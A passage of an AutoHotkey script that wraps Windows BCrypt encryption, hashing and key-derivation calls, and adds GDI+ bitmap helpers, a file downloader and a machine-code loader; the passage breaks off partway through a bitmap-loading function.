#NoEnv
#NoTrayIcon
#SingleInstance off
SetBatchLines, -1
ListLines, Off
Global A_Args:={}, MHGui:={}, Save:={}, Data:={}
SetModuleHandle()
class classCrypt {
class Encrypt {
String(AlgId, Mode := "", String := "", Key := "", IV := "", Encoding := "utf-8", Output := "BASE64") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.EncryptionAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if (CHAINING_MODE := Crypt.Verify.ChainingMode(Mode))
if !(Crypt.BCrypt.SetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_CHAINING_MODE, CHAINING_MODE))
throw Exception("SetProperty failed", -1)
if !(KEY_HANDLE := Crypt.BCrypt.GenerateSymmetricKey(ALG_HANDLE, Key, Encoding))
throw Exception("GenerateSymmetricKey failed", -1)
if !(BLOCK_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_BLOCK_LENGTH, 4))
throw Exception("GetProperty failed", -1)
cbInput := Crypt.Helper.StrPutVar(String, pbInput, Encoding)
if !(CIPHER_LENGTH := Crypt.BCrypt.Encrypt(KEY_HANDLE, pbInput, cbInput, IV, BLOCK_LENGTH, CIPHER_DATA, Crypt.Constants.BCRYPT_BLOCK_PADDING))
throw Exception("Encrypt failed", -1)
if !(ENCRYPT := Crypt.Helper.CryptBinaryToString(CIPHER_DATA, CIPHER_LENGTH, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (KEY_HANDLE)
Crypt.BCrypt.DestroyKey(KEY_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return ENCRYPT
}
}
class Decrypt {
String(AlgId, Mode := "", String := "", Key := "", IV := "", Encoding := "utf-8", Input := "BASE64") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.EncryptionAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if (CHAINING_MODE := Crypt.Verify.ChainingMode(Mode))
if !(Crypt.BCrypt.SetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_CHAINING_MODE, CHAINING_MODE))
throw Exception("SetProperty failed", -1)
if !(KEY_HANDLE := Crypt.BCrypt.GenerateSymmetricKey(ALG_HANDLE, Key, Encoding))
throw Exception("GenerateSymmetricKey failed", -1)
if !(CIPHER_LENGTH := Crypt.Helper.CryptStringToBinary(String, CIPHER_DATA, Input))
throw Exception("CryptStringToBinary failed", -1)
if !(BLOCK_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_BLOCK_LENGTH, 4))
throw Exception("GetProperty failed", -1)
if !(DECRYPT_LENGTH := Crypt.BCrypt.Decrypt(KEY_HANDLE, CIPHER_DATA, CIPHER_LENGTH, IV, BLOCK_LENGTH, DECRYPT_DATA, Crypt.Constants.BCRYPT_BLOCK_PADDING))
throw Exception("Decrypt failed", -1)
DECRYPT := StrGet(&DECRYPT_DATA, DECRYPT_LENGTH, Encoding)
}
catch Exception
{
throw Exception
}
finally
{
if (KEY_HANDLE)
Crypt.BCrypt.DestroyKey(KEY_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return DECRYPT
}
}
class Hash {
String(AlgId, String, Encoding := "utf-8", Output := "HEXRAW") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.HashAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if !(HASH_HANDLE := Crypt.BCrypt.CreateHash(ALG_HANDLE))
throw Exception("CreateHash failed", -1)
cbInput := Crypt.Helper.StrPutVar(String, pbInput, Encoding)
if !(Crypt.BCrypt.HashData(HASH_HANDLE, pbInput, cbInput))
throw Exception("HashData failed", -1)
if !(HASH_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_HASH_LENGTH, 4))
throw Exception("GetProperty failed", -1)
if !(Crypt.BCrypt.FinishHash(HASH_HANDLE, HASH_DATA, HASH_LENGTH))
throw Exception("FinishHash failed", -1)
if !(HASH := Crypt.Helper.CryptBinaryToString(HASH_DATA, HASH_LENGTH, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (HASH_HANDLE)
Crypt.BCrypt.DestroyHash(HASH_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return HASH
}
File(AlgId, FileName, Bytes := 1048576, Offset := 0, Length := -1, Encoding := "utf-8", Output := "HEXRAW"){
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.HashAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if !(HASH_HANDLE := Crypt.BCrypt.CreateHash(ALG_HANDLE))
throw Exception("CreateHash failed", -1)
if !(IsObject(File := FileOpen(FileName, "r", Encoding)))
throw Exception("Failed to open file: " FileName, -1)
Length := Length < 0 ? File.Length - Offset : Length
if ((Offset + Length) > File.Length)
throw Exception("Invalid parameters offset / length!", -1)
while (Length > Bytes) && (Dataread := File.RawRead(Data, Bytes))
{
if !(Crypt.BCrypt.HashData(HASH_HANDLE, Data, Dataread))
throw Exception("HashData failed", -1)
Length -= Dataread
}
if (Length > 0)
{
if (Dataread := File.RawRead(Data, Length))
{
if !(Crypt.BCrypt.HashData(HASH_HANDLE, Data, Dataread))
throw Exception("HashData failed", -1)
}
}
if !(HASH_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_HASH_LENGTH, 4))
throw Exception("GetProperty failed", -1)
if !(Crypt.BCrypt.FinishHash(HASH_HANDLE, HASH_DATA, HASH_LENGTH))
throw Exception("FinishHash failed", -1)
if !(HASH := Crypt.Helper.CryptBinaryToString(HASH_DATA, HASH_LENGTH, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (File)
File.Close()
if (HASH_HANDLE)
Crypt.BCrypt.DestroyHash(HASH_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return HASH
}
HMAC(AlgId, String, Hmac, Encoding := "utf-8", Output := "HEXRAW") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.HashAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER, Crypt.Constants.BCRYPT_ALG_HANDLE_HMAC_FLAG))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if !(HASH_HANDLE := Crypt.BCrypt.CreateHash(ALG_HANDLE, Hmac, Encoding))
throw Exception("CreateHash failed", -1)
cbInput := Crypt.helper.StrPutVar(String, pbInput, Encoding)
if !(Crypt.BCrypt.HashData(HASH_HANDLE, pbInput, cbInput))
throw Exception("HashData failed", -1)
if !(HASH_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_HASH_LENGTH, 4))
throw Exception("GetProperty failed", -1)
if !(Crypt.BCrypt.FinishHash(HASH_HANDLE, HASH_DATA, HASH_LENGTH))
throw Exception("FinishHash failed", -1)
if !(HMAC := Crypt.Helper.CryptBinaryToString(HASH_DATA, HASH_LENGTH, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (HASH_HANDLE)
Crypt.BCrypt.DestroyHash(HASH_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return HMAC
}
PBKDF2(AlgId, Password, Salt, Iterations := 4096, KeySize := 256, Encoding := "utf-8", Output := "HEXRAW") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.HashAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER, Crypt.Constants.BCRYPT_ALG_HANDLE_HMAC_FLAG))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if !(Crypt.BCrypt.DeriveKeyPBKDF2(ALG_HANDLE, Password, Salt, Iterations, PBKDF2_DATA, KeySize / 8, Encoding))
throw Exception("CreateHash failed", -1)
if !(PBKDF2 := Crypt.Helper.CryptBinaryToString(PBKDF2_DATA , KeySize / 8, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return PBKDF2
}
}
class BCrypt {
static hBCRYPT := DllCall("LoadLibrary", "str", "bcrypt.dll", "ptr")
static STATUS_SUCCESS := 0
CloseAlgorithmProvider(hAlgorithm) {
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "ptr", hAlgorithm, "uint", 0)
}
CreateHash(hAlgorithm, hmac := 0, encoding := "utf-8") {
if (hmac)
cbSecret := Crypt.helper.StrPutVar(hmac, pbSecret, encoding)
NT_STATUS := DllCall("bcrypt\BCryptCreateHash", "ptr",  hAlgorithm
, "ptr*", phHash
, "ptr",  pbHashObject := 0
, "uint", cbHashObject := 0
, "ptr",  (pbSecret ? &pbSecret : 0)
, "uint", (cbSecret ? cbSecret : 0)
, "uint", dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return phHash
return false
}
DeriveKeyPBKDF2(hPrf, Password, Salt, cIterations, ByRef pbDerivedKey, cbDerivedKey, Encoding := "utf-8") {
cbPassword := Crypt.Helper.StrPutVar(Password, pbPassword, Encoding)
cbSalt := Crypt.Helper.StrPutVar(Salt, pbSalt, Encoding)
VarSetCapacity(pbDerivedKey, cbDerivedKey, 0)
NT_STATUS := DllCall("bcrypt\BCryptDeriveKeyPBKDF2", "ptr",   hPrf
, "ptr",   &pbPassword
, "uint",  cbPassword
, "ptr",   &pbSalt
, "uint",  cbSalt
, "int64", cIterations
, "ptr",   &pbDerivedKey
, "uint",  cbDerivedKey
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return true
return false
}
DestroyHash(hHash) {
DllCall("bcrypt\BCryptDestroyHash", "ptr", hHash)
}
DestroyKey(hKey) {
DllCall("bcrypt\BCryptDestroyKey", "ptr", hKey)
}
Decrypt(hKey, ByRef String, cbInput, IV, BCRYPT_BLOCK_LENGTH, ByRef pbOutput, dwFlags) {
VarSetCapacity(pbInput, cbInput, 0)
DllCall("msvcrt\memcpy", "ptr", &pbInput, "ptr", &String, "ptr", cbInput)
if (IV != "")
{
cbIV := VarSetCapacity(pbIV, BCRYPT_BLOCK_LENGTH, 0)
StrPut(IV, &pbIV, BCRYPT_BLOCK_LENGTH, Encoding)
}
NT_STATUS := DllCall("bcrypt\BCryptDecrypt", "ptr",   hKey
, "ptr",   &pbInput
, "uint",  cbInput
, "ptr",   0
, "ptr",   (pbIV ? &pbIV : 0)
, "uint",  (cbIV ? &cbIV : 0)
, "ptr",   0
, "uint",  0
, "uint*", cbOutput
, "uint",  dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
{
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptDecrypt", "ptr",   hKey
, "ptr",   &pbInput
, "uint",  cbInput
, "ptr",   0
, "ptr",   (pbIV ? &pbIV : 0)
, "uint",  (cbIV ? &cbIV : 0)
, "ptr",   &pbOutput
, "uint",  cbOutput
, "uint*", cbOutput
, "uint",  dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
{
return cbOutput
}
}
return false
}
Encrypt(hKey, ByRef pbInput, cbInput, IV, BCRYPT_BLOCK_LENGTH, ByRef pbOutput, dwFlags := 0) {
if (IV != "")
{
cbIV := VarSetCapacity(pbIV, BCRYPT_BLOCK_LENGTH, 0)
StrPut(IV, &pbIV, BCRYPT_BLOCK_LENGTH, Encoding)
}
NT_STATUS := DllCall("bcrypt\BCryptEncrypt", "ptr",   hKey
, "ptr",   &pbInput
, "uint",  cbInput
, "ptr",   0
, "ptr",   (pbIV ? &pbIV : 0)
, "uint",  (cbIV ? &cbIV : 0)
, "ptr",   0
, "uint",  0
, "uint*", cbOutput
, "uint",  dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
{
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptEncrypt", "ptr",   hKey
, "ptr",   &pbInput
, "uint",  cbInput
, "ptr",   0
, "ptr",   (pbIV ? &pbIV : 0)
, "uint",  (cbIV ? &cbIV : 0)
, "ptr",   &pbOutput
, "uint",  cbOutput
, "uint*", cbOutput
, "uint",  dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
{
return cbOutput
}
}
return false
}
EnumAlgorithms(dwAlgOperations) {
NT_STATUS := DllCall("bcrypt\BCryptEnumAlgorithms", "uint",  dwAlgOperations
, "uint*", pAlgCount
, "ptr*",  ppAlgList
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
{
addr := ppAlgList, BCRYPT_ALGORITHM_IDENTIFIER := []
loop % pAlgCount
{
BCRYPT_ALGORITHM_IDENTIFIER[A_Index, "Name"]  := StrGet(NumGet(addr + A_PtrSize * 0, "uptr"), "utf-16")
BCRYPT_ALGORITHM_IDENTIFIER[A_Index, "Class"] := NumGet(addr + A_PtrSize * 1, "uint")
BCRYPT_ALGORITHM_IDENTIFIER[A_Index, "Flags"] := NumGet(addr + A_PtrSize * 1 + 4, "uint")
addr += A_PtrSize * 2
}
return BCRYPT_ALGORITHM_IDENTIFIER
}
return false
}
EnumProviders(pszAlgId) {
NT_STATUS := DllCall("bcrypt\BCryptEnumProviders", "ptr",   pszAlgId
, "uint*", pImplCount
, "ptr*",  ppImplList
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
{
addr := ppImplList, BCRYPT_PROVIDER_NAME := []
loop % pImplCount
{
BCRYPT_PROVIDER_NAME.Push(StrGet(NumGet(addr + A_PtrSize * 0, "uptr"), "utf-16"))
addr += A_PtrSize
}
return BCRYPT_PROVIDER_NAME
}
return false
}
FinishHash(hHash, ByRef pbOutput, cbOutput) {
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptFinishHash", "ptr",  hHash
, "ptr",  &pbOutput
, "uint", cbOutput
, "uint", dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return cbOutput
return false
}
GenerateSymmetricKey(hAlgorithm, Key, Encoding := "utf-8") {
cbSecret := Crypt.Helper.StrPutVar(Key, pbSecret, Encoding)
NT_STATUS := DllCall("bcrypt\BCryptGenerateSymmetricKey", "ptr",  hAlgorithm
, "ptr*", phKey
, "ptr",  0
, "uint", 0
, "ptr",  &pbSecret
, "uint", cbSecret
, "uint", dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return phKey
return false
}
GetProperty(hObject, pszProperty, cbOutput) {
NT_STATUS := DllCall("bcrypt\BCryptGetProperty", "ptr",   hObject
, "ptr",   &pszProperty
, "uint*", pbOutput
, "uint",  cbOutput
, "uint*", pcbResult
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return pbOutput
return false
}
HashData(hHash, ByRef pbInput, cbInput) {
NT_STATUS := DllCall("bcrypt\BCryptHashData", "ptr",  hHash
, "ptr",  &pbInput
, "uint", cbInput
, "uint", dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return true
return false
}
OpenAlgorithmProvider(pszAlgId, dwFlags := 0, pszImplementation := 0) {
NT_STATUS := DllCall("bcrypt\BCryptOpenAlgorithmProvider", "ptr*", phAlgorithm
, "ptr",  &pszAlgId
, "ptr",  pszImplementation
, "uint", dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
return phAlgorithm
return false
}
SetProperty(hObject, pszProperty, pbInput) {
bInput := StrLen(pbInput)
NT_STATUS := DllCall("bcrypt\BCryptSetProperty", "ptr",   hObject
, "ptr",   &pszProperty
, "ptr",   &pbInput
, "uint",  bInput
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return true
return false
}
}
class Helper {
static hCRYPT32 := DllCall("LoadLibrary", "str", "crypt32.dll", "ptr")
CryptBinaryToString(ByRef pbBinary, cbBinary, dwFlags := "BASE64") {
static CRYPT_STRING := { "BASE64": 0x1, "BINARY": 0x2, "HEX": 0x4, "HEXRAW": 0xc }
static CRYPT_STRING_NOCRLF := 0x40000000
if (DllCall("crypt32\CryptBinaryToString", "ptr",   &pbBinary
, "uint",  cbBinary
, "uint",  (CRYPT_STRING[dwFlags] | CRYPT_STRING_NOCRLF)
, "ptr",   0
, "uint*", pcchString))
{
VarSetCapacity(pszString, pcchString << !!A_IsUnicode, 0)
if (DllCall("crypt32\CryptBinaryToString", "ptr",   &pbBinary
, "uint",  cbBinary
, "uint",  (CRYPT_STRING[dwFlags] | CRYPT_STRING_NOCRLF)
, "ptr",   &pszString
, "uint*", pcchString))
{
return StrGet(&pszString)
}
}
return false
}
CryptStringToBinary(pszString, ByRef pbBinary, dwFlags := "BASE64") {
static CRYPT_STRING := { "BASE64": 0x1, "BINARY": 0x2, "HEX": 0x4, "HEXRAW": 0xc }
if (DllCall("crypt32\CryptStringToBinary", "ptr",   &pszString
, "uint",  0
, "uint",  CRYPT_STRING[dwFlags]
, "ptr",   0
, "uint*", pcbBinary
, "ptr",   0
, "ptr",   0))
{
VarSetCapacity(pbBinary, pcbBinary, 0)
if (DllCall("crypt32\CryptStringToBinary", "ptr",   &pszString
, "uint",  0
, "uint",  CRYPT_STRING[dwFlags]
, "ptr",   &pbBinary
, "uint*", pcbBinary
, "ptr",   0
, "ptr",   0))
{
return pcbBinary
}
}
return false
}
StrPutVar(String, ByRef Data, Encoding) {
if (Encoding = "hex")
{
String := InStr(String, "0x") ? SubStr(String, 3) : String
VarSetCapacity(Data, (Length := StrLen(String) // 2), 0)
loop % Length
NumPut("0x" SubStr(String, 2 * A_Index - 1, 2), Data, A_Index - 1, "char")
return Length
}
else
{
VarSetCapacity(Data, Length := StrPut(String, Encoding) * ((Encoding = "utf-16" || Encoding = "cp1200") ? 2 : 1) - 1)
return StrPut(String, &Data, Length, Encoding)
}
}
}
class Verify {
ChainingMode(ChainMode) {
switch ChainMode
{
case "CBC", "ChainingModeCBC": return Crypt.Constants.BCRYPT_CHAIN_MODE_CBC
case "CFB", "ChainingModeCFB": return Crypt.Constants.BCRYPT_CHAIN_MODE_CFB
case "ECB", "ChainingModeECB": return Crypt.Constants.BCRYPT_CHAIN_MODE_ECB
default: return ""
}
}
EncryptionAlgorithm(Algorithm) {
switch Algorithm
{
case "AES":                return Crypt.Constants.BCRYPT_AES_ALGORITHM
case "DES":                return Crypt.Constants.BCRYPT_DES_ALGORITHM
case "RC2":                return Crypt.Constants.BCRYPT_RC2_ALGORITHM
case "RC4":                return Crypt.Constants.BCRYPT_RC4_ALGORITHM
default: return ""
}
}
HashAlgorithm(Algorithm) {
switch Algorithm
{
case "MD2":               return Crypt.Constants.BCRYPT_MD2_ALGORITHM
case "MD4":               return Crypt.Constants.BCRYPT_MD4_ALGORITHM
case "MD5":               return Crypt.Constants.BCRYPT_MD5_ALGORITHM
case "SHA1", "SHA-1":     return Crypt.Constants.BCRYPT_SHA1_ALGORITHM
case "SHA256", "SHA-256": return Crypt.Constants.BCRYPT_SHA256_ALGORITHM
case "SHA384", "SHA-384": return Crypt.Constants.BCRYPT_SHA384_ALGORITHM
case "SHA512", "SHA-512": return Crypt.Constants.BCRYPT_SHA512_ALGORITHM
default: return ""
}
}
}
class Constants {
static BCRYPT_ALG_HANDLE_HMAC_FLAG            := 0x00000008
static BCRYPT_BLOCK_PADDING                   := 0x00000001
static BCRYPT_CIPHER_OPERATION                := 0x00000001
static BCRYPT_HASH_OPERATION                  := 0x00000002
static BCRYPT_ASYMMETRIC_ENCRYPTION_OPERATION := 0x00000004
static BCRYPT_SECRET_AGREEMENT_OPERATION      := 0x00000008
static BCRYPT_SIGNATURE_OPERATION             := 0x00000010
static BCRYPT_RNG_OPERATION                   := 0x00000020
static BCRYPT_KEY_DERIVATION_OPERATION        := 0x00000040
static BCRYPT_3DES_ALGORITHM                  := "3DES"
static BCRYPT_3DES_112_ALGORITHM              := "3DES_112"
static BCRYPT_AES_ALGORITHM                   := "AES"
static BCRYPT_AES_CMAC_ALGORITHM              := "AES-CMAC"
static BCRYPT_AES_GMAC_ALGORITHM              := "AES-GMAC"
static BCRYPT_DES_ALGORITHM                   := "DES"
static BCRYPT_DESX_ALGORITHM                  := "DESX"
static BCRYPT_MD2_ALGORITHM                   := "MD2"
static BCRYPT_MD4_ALGORITHM                   := "MD4"
static BCRYPT_MD5_ALGORITHM                   := "MD5"
static BCRYPT_RC2_ALGORITHM                   := "RC2"
static BCRYPT_RC4_ALGORITHM                   := "RC4"
static BCRYPT_RNG_ALGORITHM                   := "RNG"
static BCRYPT_SHA1_ALGORITHM                  := "SHA1"
static BCRYPT_SHA256_ALGORITHM                := "SHA256"
static BCRYPT_SHA384_ALGORITHM                := "SHA384"
static BCRYPT_SHA512_ALGORITHM                := "SHA512"
static BCRYPT_PBKDF2_ALGORITHM                := "PBKDF2"
static BCRYPT_XTS_AES_ALGORITHM               := "XTS-AES"
static BCRYPT_BLOCK_LENGTH                    := "BlockLength"
static BCRYPT_CHAINING_MODE                   := "ChainingMode"
static BCRYPT_CHAIN_MODE_CBC                  := "ChainingModeCBC"
static BCRYPT_CHAIN_MODE_CCM                  := "ChainingModeCCM"
static BCRYPT_CHAIN_MODE_CFB                  := "ChainingModeCFB"
static BCRYPT_CHAIN_MODE_ECB                  := "ChainingModeECB"
static BCRYPT_CHAIN_MODE_GCM                  := "ChainingModeGCM"
static BCRYPT_HASH_LENGTH                     := "HashDigestLength"
static BCRYPT_OBJECT_LENGTH                   := "ObjectLength"
}
}
LoadGDIplus(){
UPtr()
VarSetCapacity(startInput, A_PtrSize = 8 ? 24 : 16, 0), startInput := Chr(1)
HModuleGdip := DllCall("LoadLibrary", "Str", "gdiplus", "Ptr")
DllCall("gdiplus\GdiplusStartup", "Ptr*", pToken, "Ptr", &startInput, "Ptr", 0)
A_Args.Proc:={}
A_Args.Proc.BitBlt                  := DllCall("GetProcAddress", "Ptr", DllCall("GetModuleHandle", "Str", "gdi32", "Ptr"), "AStr", "BitBlt", "Ptr")
A_Args.Proc.CloneBitmap             := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipCloneBitmapArea", "Ptr")
A_Args.Proc.BitmapLock              := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipBitmapLockBits", "Ptr")
A_Args.Proc.BitmapUnlock            := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipBitmapUnlockBits", "Ptr")
A_Args.Proc.DisposeImage            := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipDisposeImage", "Ptr")
A_Args.Proc.DrawImageRect           := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipDrawImageRect", "Ptr")
A_Args.Proc.DrawImageFast           := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipDrawImage", "Ptr")
A_Args.Proc.GetImageGraphic         := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipGetImageGraphicsContext", "Ptr")
A_Args.Proc.CreateBitmapFromScan    := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipCreateBitmapFromScan0", "Ptr")
A_Args.Proc.CreateBitmapFromHBITMAP := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipCreateBitmapFromHBITMAP", "Ptr")
A_Args.Proc.CreateBitmapFromFile    := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipCreateBitmapFromFile", "Ptr")
}
Gdip_GetFile(url, filename){
static a:="AutoHotkey/" A_AhkVersion, c:=0, s:=0
if (!(o := FileOpen(filename, "w")) || !DllCall("LoadLibrary", "str", "wininet") || !(h := DllCall("wininet\InternetOpen", "str", a, "uint", 1, "ptr", 0, "ptr", 0, "uint", 0, "ptr")))
return 0
if (f := DllCall("wininet\InternetOpenUrl", "ptr", h, "str", url, "ptr", 0, "uint", 0, "uint", 0x80003000, "ptr", 0, "ptr")){
while (DllCall("wininet\InternetQueryDataAvailable", "ptr", f, "uint*", s, "uint", 0, "ptr", 0) && s>0){
VarSetCapacity(b, s, 0)
DllCall("wininet\InternetReadFile", "ptr", f, "ptr", &b, "uint", s, "uint*", r), c += r
o.rawWrite(b, r)
}
DllCall("wininet\InternetCloseHandle", "ptr", f)
}
DllCall("wininet\InternetCloseHandle", "ptr", h)
o.close()
return c
}
GetInBetween(string,PontA,PontB,ByRef Pos:=""){
Pos := RegExMatch(string, "(?<=" PontA ")(.*)(?=" PontB ")", Info)
Return Info
}
Gdip_UTF(In){
Return StrGet(&In,"UTF-8")
}
Gdip_GetImageDimensions(pBitmap, ByRef Width, ByRef Height){
If StrLen(pBitmap)<3
Return -1
Width := 0, Height := 0
E := DllCall("gdiplus\GdipGetImageDimension", "UPtr", pBitmap, "float*", Width, "float*", Height)
Width := Round(Width)
Height := Round(Height)
return E
}
Gdip_RunMCode(mcode){
static e := {1:4, 2:1}, c := (A_PtrSize=8) ? "x64" : "x86"
if (!regexmatch(mcode, "^([0-9]+),(" c ":|.*?," c ":)([^,]+)", m))
return
if (!DllCall("crypt32\CryptStringToBinary", "str", m3, "uint", StrLen(m3), "uint", e[m1], "ptr", 0, "uintp", s, "ptr", 0, "ptr", 0))
return
p := DllCall("GlobalAlloc", "uint", 0, "ptr", s, "ptr")
DllCall("VirtualProtect", "ptr", p, "ptr", s, "uint", 0x40, "uint*", op)
if (DllCall("crypt32\CryptStringToBinary", "str", m3, "uint", StrLen(m3), "uint", e[m1], "ptr", p, "uint*", s, "ptr", 0, "ptr", 0))
return p
DllCall("GlobalFree", "ptr", p)
}
MsgData(Obj, Type:=""){
if (!IsObject(obj)){
try
Obj := Data["Msg"][Obj]
MsgBox, % Type, % Obj["T"][Save.Ling], % Obj["M"][Save.Ling]
Return
}
MsgBox, % Type, % Obj.1, % Obj.2
}
Gdip_CreateBitmap(Width, Height, PixelFormat:=0, Stride:=0, Scan0:=0){
pBitmap := 0
If !PixelFormat
PixelFormat := 0x26200A
DllCall(A_Args.Proc.CreateBitmapFromScan, "int", Width, "int", Height, "int", Stride, "int", PixelFormat, "UPtr", Scan0, "UPtr*", pBitmap)
Return pBitmap
}
Gdip_CreateBitmapFromFile(sFile, IconNumber:=1, IconSize:="", useICM:=0){
pBitmap := 0
, pBitmapOld := 0
, hIcon := 0
SplitPath sFile,,, Extension
if RegExMatch(Extension, "^(?i:exe|dll)$"){
Sizes := IconSize ? IconSize : 256 "|" 128 "|" 64 "|" 48 "|" 32 "|" 16
BufSize := 16 + (2*A_PtrSize)
VarSetCapacity(buf, BufSize, 0)
For eachSize, Size in StrSplit( Sizes, "|" ){
DllCall("PrivateExtractIcons", "str", sFile, "int", IconNumber-1, "int", Size, "int", Size, "UPtr*", hIcon, "UPtr*", 0, "uint", 1, "uint", 0)
if !hIcon
continue
if !DllCall("GetIconInfo", "UPtr", hIcon, "UPtr", &buf){
DllCall("DestroyIcon", "UPtr", hIcon)
continue
}
hbmMask := NumGet(buf, 12 + (A_PtrSize - 4))
hbmColor := NumGet(buf, 12 + (A_PtrSize - 4) + A_PtrSize)
if !(hbmColor && DllCall("GetObject", "UPtr", hbmColor, "int", BufSize, "UPtr", &buf)){
DllCall("DestroyIcon", "UPtr", hIcon)
continue
}
break
}
if !hIcon
return -1
Width := NumGet(buf, 4, "int"), Height := NumGet(buf, 8, "int")
hbm := CreateDIBSection(Width, -Height), hdc := CreateCompatibleDC(), obm := SelectObject(hdc, hbm)
if !DllCall("DrawIconEx", "UPtr", hdc, "int", 0, "int", 0, "UPtr", hIcon, "uint", Width, "uint", Height, "uint", 0, "UPtr", 0, "uint", 3){
DllCall("DestroyIcon", "UPtr", hIcon)
return -2
}
VarSetCapacity(dib, 104)
, DllCall("GetObject", "UPtr", hbm, "int", A_PtrSize = 8 ? 104 : 84, "UPtr", &dib)
, Stride := NumGet(dib, 12, "Int"), Scan0 := NumGet(dib, 20 + (A_PtrSize = 8 ? 4 : 0))
, DllCall(A_Args.Proc.CreateBitmapFromScan, "int", Width, "int", Height, "int", Stride, "int", 0x26200A, "UPtr", Scan0, "UPtr*", pBitmapOld)
, DllCall(A_Args.Proc.CreateBitmapFromScan, "int", Width, "int", Height, "int", 0, "int", 0x26200A, "UPtr", 0, "UPtr*", pBitmap)
, DllCall(A_Args.Proc.GetImageGraphic, "UPtr", pBitmap, "UPtr*", _G)
SelectObject(hdc, obm)
, DeleteObject(hbm)
, DeleteDC(hdc)
, Gdip_DeleteGraphics(_G)
, Gdip_DisposeImage(pBitmapOld)
